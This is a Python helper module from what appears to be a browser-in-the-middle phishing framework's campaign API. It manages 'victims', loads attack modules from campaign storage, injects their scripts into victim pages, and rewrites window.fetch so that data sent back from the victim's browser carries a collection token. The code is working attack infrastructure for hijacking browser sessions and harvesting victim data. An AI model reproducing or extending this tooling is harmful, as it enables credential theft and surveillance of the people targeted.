"""Shared dependencies and helpers for private campaign API routes."""
import asyncio
import json
import re
from fastapi import (
    APIRouter,
    Depends,
    File,
    Header,
    HTTPException,
    Query,
    UploadFile,
)
from fastapi.responses import JSONResponse
from core.websocket_manager import ws_manager
from db.database import (
    get_active_victims, get_victim, get_victim_data,
    save_data_collection,
    add_victim_event
)
import os
from config import settings
from pathlib import Path
import logging
import base64
import hmac
import httpx
from pydantic import BaseModel, ConfigDict, Field
from typing import Literal
from core.victim_auth import derive_victim_api_key
from core.stream_access import stream_access
from core.uploads import (
    UploadValidationError,
    configured_upload_limit,
    resolve_local_file,
    read_upload_limited,
    validate_transfer_filename,
)
from core.request_models import (
    CommandRequest,
    EventProxyRequest,
    ExecuteModuleRequest,
    SiteInfoRequest,
    VictimDataRequest,
)
from utils.landing_page import get_template_content
from utils.safe_remote import UnsafeRemoteURLError, validate_public_http_url

logger = logging.getLogger(__name__)


def extract_scripts_from_html(html_content: str):
    """
    Extract <script> tags from HTML and wrap content in IIFE with 'use strict'
    Returns: (cleaned_html, extracted_js)
    """
    # Find all script tags (including inline and with attributes)
    script_pattern = r'<script[^>]*>(.*?)</script>'
    scripts = re.findall(script_pattern, html_content, re.DOTALL | re.IGNORECASE)

    logger.info("Found %s module script tag(s)", len(scripts))

    if not scripts:
        return html_content, None

    # Remove script tags from HTML
    cleaned_html = re.sub(script_pattern, '', html_content, flags=re.DOTALL | re.IGNORECASE)

    # Combine all scripts and wrap in IIFE
    combined_js = '\n'.join(scripts)
    wrapped_js = f"""
(function() {{
    'use strict';
    {combined_js}
}})();
""".strip()

    logger.info(
        "Extracted %s module script tag(s), %s characters total",
        len(scripts),
        len(wrapped_js),
    )
    return cleaned_html, wrapped_js


def get_module_content(module_id: str) -> dict:
    """Load Module JSON from campaign storage"""
    try:
        module_filename = f"{module_id}.json"
        modules_dir = os.path.join(settings.STORAGE_PATH, "modules")

        # Find module file in any campaign directory
        if os.path.isdir(modules_dir):
            full_path = os.path.join(modules_dir, module_filename)
            if os.path.exists(full_path):
                with open(full_path, "r", encoding='utf-8') as f:
                    module_data = json.load(f)
                logger.info(f"✅ Loaded module {module_id} from storage")
                return module_data

        logger.error(f"Module file not found: {module_id}")
        return None
    except Exception as e:
        logger.error(f"Error loading module {module_id}: {e}")
        return None


def substitute_params(content: str, params: dict) -> str:
    """Substitute {{ params[i] }} placeholders with actual values"""
    result = content
    for key, value in params.items():
        placeholder = f"{{{{ params[{key}] }}}}"
        if isinstance(value, str):
            result = result.replace(placeholder, value)
        else:
            result = result.replace(placeholder, json.dumps(value))
    return result


def authorize_module_fetches(script: str, victim_id: str, token: str) -> str:
    """Shadow fetch so module submissions carry the active-session credential."""
    victim_json = json.dumps(victim_id)
    token_json = json.dumps(token)
    return f"""
(function() {{
    const __bitmVictimId = {victim_json};
    const __bitmCollectionToken = {token_json};
    const __bitmNativeFetch = window.fetch.bind(window);
    const fetch = function(input, init) {{
        const requestUrl = new URL(
            typeof input === "string" ? input : input.url,
            window.location.href
        );
        const expectedPath = `/c/${{__bitmVictimId}}`;
        if (requestUrl.origin === window.location.origin &&
            requestUrl.pathname.endsWith(expectedPath)) {{
            const options = Object.assign({{}}, init || {{}});
            const headers = new Headers(options.headers || {{}});
            headers.set("X-BITM-Collection-Token", __bitmCollectionToken);
            options.headers = headers;
            return __bitmNativeFetch(input, options);
        }}
        return __bitmNativeFetch(input, init);
    }};
    {script}
}})();
""".strip()


async def verify_api_token(
    x_internal_api_key: str = Header(None),
):
    """Verify the internal API key shared with the admin backend."""
    if x_internal_api_key and hmac.compare_digest(
        x_internal_api_key,
        settings.INTERNAL_API_KEY,
    ):
        return True

    logger.warning("Rejected internal API request with invalid or missing credentials")
    raise HTTPException(403, "Invalid or missing credentials")


async def verify_victim_api_token(
    victim_id: str,
    x_victim_api_key: str = Header(None),
):
    """Only accept callbacks authenticated by the matching victim container."""
    expected_key = derive_victim_api_key(settings.INTERNAL_API_KEY, victim_id)
    if x_victim_api_key and hmac.compare_digest(x_victim_api_key, expected_key):
        return True
    logger.warning(
        "Rejected victim callback for %s with invalid or missing credentials",
        victim_id,
    )
    raise HTTPException(403, "Invalid or missing victim credentials")
